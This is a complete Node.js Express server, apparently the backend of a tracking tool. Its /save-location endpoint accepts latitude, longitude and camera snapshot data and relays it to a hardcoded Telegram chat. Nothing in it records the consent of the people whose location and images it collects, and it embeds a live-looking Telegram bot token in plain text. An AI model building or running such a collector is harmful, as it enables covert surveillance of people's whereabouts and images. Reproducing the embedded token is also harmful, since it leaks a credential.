const express = require("express");
const fetch = require("node-fetch");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

const botToken = "7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds";
const chatId = "868517021";  // Your Chat ID

// Function to send messages to Telegram
function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log("Message sent to Telegram:", data);
    })
    .catch(error => {
        console.error("Error sending message:", error);
    });
}

// Endpoint to receive location and snapshot data
app.post("/save-location", (req, res) => {
    const { latitude, longitude, snapshot } = req.body;
    console.log("Received Data:", { latitude, longitude, snapshot });

    const message = `Location: Latitude ${latitude}, Longitude ${longitude}\nSnapshot: ${snapshot ? "Snapshot available" : "No snapshot"}`;
    sendToTelegram(message);  // Send location and snapshot to Telegram

    res.status(200).send("Data received and sent to Telegram");
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
